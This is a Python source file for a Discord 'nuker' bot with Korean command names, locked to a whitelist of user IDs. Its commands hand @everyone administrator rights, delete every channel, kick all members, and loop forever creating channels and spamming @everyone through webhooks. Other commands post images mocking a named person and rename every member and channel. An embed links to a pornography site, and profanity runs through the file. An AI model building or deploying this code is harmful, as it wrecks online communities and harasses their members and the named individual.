import discord
from discord.ext import commands
from discord.utils import get
import random
from dhooks import Webhook
import json

token = '토큰 넣어주세요'

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix="%", intents=intents)

@bot.event
async def on_ready():
    print("켜졌어")

@bot.command(name="즐겁다")
async def _clean(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        every = get(ctx.guild.roles, name="@everyone")
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await every.edit(reason = None, permissions=permissions)
        name = '채팅 채널'
        name2 = "음성 채널"
        owner = str(ctx.guild.owner.name)
        emojini = get(ctx.guild.emojis)
        roles = get(ctx.guild.roles)
        categories = get(ctx.guild.categories, name=name)
        categories2 = get(ctx.guild.categories, name=name2)
        await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
        for c in ctx.guild.text_channels:
            await c.delete()
        for ch in ctx.guild.voice_channels:
            await ch.delete()
        for cha in ctx.guild.categories:
            await cha.delete()
        await ctx.guild.create_category("채팅 채널")
        await ctx.guild.create_category("음성 채널")
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await every.edit(reason = None, permissions=permissions)
        name = '채팅 채널'
        name2 = "음성 채널"
        categories = get(ctx.guild.categories, name=name)
        categories2 = get(ctx.guild.categories, name=name2)
        await ctx.guild.create_text_channel("일반", category=categories)
        await ctx.guild.create_voice_channel("일반", category=categories2)
        channel = get(ctx.guild.channels, name="일반")
        embed = discord.Embed(title="서버도 깔끔", description="미리-삭제한 서버!")
        embed.set_footer(text="그냥 터트려서 대접하세요!")
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/805377615661760515/811551946540318740/2021-02-17_7.57.22.png?")
        embed.set_author(name="사회적비판을받을수있는기계 by 퍼젠#6974 and Dev. Hestia#5444 dm 좆지랄염병 환영!", url="https://pornhub.com", icon_url="https://avatars.githubusercontent.com/u/69731703?s=460&u=55f606bd6e38d755c119f58975f192f5c77b51c8&v=4")
        await channel.send(embed=embed)
        for member in ctx.guild.members:
            try:
                await member.kick()
            except:
                print("1명 밴 못함")

        
@bot.command(name="안즐겁다")
async def _masscreate(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        while True:
            await ctx.guild.create_text_channel(name="즐겁다")
            await ctx.guild.create_voice_channel(name="즐겁다")
            await ctx.guild.create_category(name="즐겁다")
            for i in ctx.guild.text_channels:
                await i.send("안즐겁다")

@bot.command(name="흥미롭다")
async def _kimdonggun(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        while True:
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            await ctx.guild.create_text_channel(name=f"김동균")
            randomhh = ["https://media.discordapp.net/attachments/731949136282386434/813979038770135060/4fc6f1a85feabc73.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813978638629470208/09a80bbf01e068e1.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813976680292155442/cbf697593250ec88.png?width=894&height=670", "https://media.discordapp.net/attachments/813969741118570526/813975743297093692/2c181b5de6521eaf.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813975329840037898/298834326dc65a46.png?width=894&height=670", "https://media.discordapp.net/attachments/731949136282386434/813979038770135060/4fc6f1a85feabc73.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813978638629470208/09a80bbf01e068e1.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813976680292155442/cbf697593250ec88.png?width=894&height=670", "https://media.discordapp.net/attachments/813969741118570526/813975743297093692/2c181b5de6521eaf.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813975329840037898/298834326dc65a46.png?width=894&height=670", "https://media.discordapp.net/attachments/813969741118570526/813975077401133066/china.png?width=1191&height=670", "https://media.discordapp.net/attachments/813969741118570526/813975067662221322/03ad5698e04915ae.png?width=670&height=670", "https://media.discordapp.net/attachments/813969741118570526/813974840386125854/kimdonggyun_is_watching_you.png?width=503&height=670", "https://media.discordapp.net/attachments/813969741118570526/813974747473248266/EB8F99EBACBC.png", "https://media.discordapp.net/attachments/813969741118570526/813975067662221322/03ad5698e04915ae.png?width=670&height=670", "https://media.discordapp.net/attachments/813969741118570526/813974840386125854/kimdonggyun_is_watching_you.png?width=503&height=670", "https://media.discordapp.net/attachments/813969741118570526/813974747473248266/EB8F99EBACBC.png"]
            condom = random.choice(randomhh)
            for i in ctx.guild.text_channels:
                await i.send(condom)

@bot.command(name="좆같다")
async def _masseveryone(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        for i in ctx.guild.text_channels:
            await i.create_webhook(name="즐겁다")
        everyone = get(ctx.guild.roles, name="@everyone")
        wlist = []
        while True:
            for w in await ctx.guild.webhooks():
                wlist.append(f"{w.url}")
            webhooking = wlist[0]
            webhook = Webhook(webhooking)
            webhook.send(f"{everyone}")  

@bot.command(name="죄송하다")
async def _sorry(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        for i in ctx.guild.text_channels:
            await i.edit(name="죄송하다") 
        for a in ctx.guild.voice_channels:
            await a.edit(name="죄송하다") 
        for c in ctx.guild.channels:
            await c.edit(name="죄송하다") 

@bot.command(name="X스하다")
async def _sexx(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        await ctx.guild.edit(icon=None, name=f"X")
        await ctx.send("터뜨려서 대접하다")

@bot.command(name="대단하다")
async def _great(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        for i in ctx.guild.members:
            await i.edit(nick="대단하다")
            await ctx.guild.edit(name="대단하다")

@bot.command(name="도움하다")
async def _help(ctx):
    with open("I enjoy.json") as json_file:
        json_data = json.load(json_file)
    if str(ctx.author.id) not in json_data:
        await ctx.send("즐겁다")
    else:
        embed = discord.Embed(title="도움하다", description="도움을 요청해서 도움을 하다")
        embed.add_field(name="즐겁다", value="서버를 초기화하다")
        embed.add_field(name="안즐겁다", value="채널을 만들다")
        embed.add_field(name="흥미롭다", value="김동균이 되다")
        embed.add_field(name="죄송하다", value="채널이 죄송하다")
        embed.add_field(name="좆같다", value="웹후크는 대단하다")
        embed.add_field(name="섹스하다", value="모텔로 바꾸다")
        embed.add_field(name="대단하다", value="노예로 바꾸다")
        await ctx.send(embed=embed)

bot.run(token)
